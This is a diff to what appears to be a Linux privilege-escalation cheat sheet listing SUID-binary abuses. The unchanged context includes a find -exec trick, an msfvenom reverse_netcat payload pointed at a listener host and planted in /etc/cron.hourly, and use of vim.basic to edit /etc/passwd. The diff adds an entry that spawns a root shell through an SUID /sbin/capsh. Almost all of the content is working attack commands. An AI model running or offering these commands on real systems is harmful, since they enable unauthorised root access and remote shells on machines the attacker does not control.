@@ -330,6 +330,7 @@ find with suid perm:
 touch raj
 find raj -exec "whoami" \;
 ```
+
 ```
 cp with suid perm:
 
@@ -341,10 +342,16 @@ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=1234 R
 cp raj.sh /etc/cron.hourly/
 ls -al /etc/cron.hourly/
 ```
+
 ```
 vim.basic with suid:
 
 vim.basic /etc/passwd
+```
+
+```
+/sbin/capsh with suid:
+/sbin/capsh --gid=0 --uid=0 --
 ```
 
  ###### Cronjob to elevate privilege
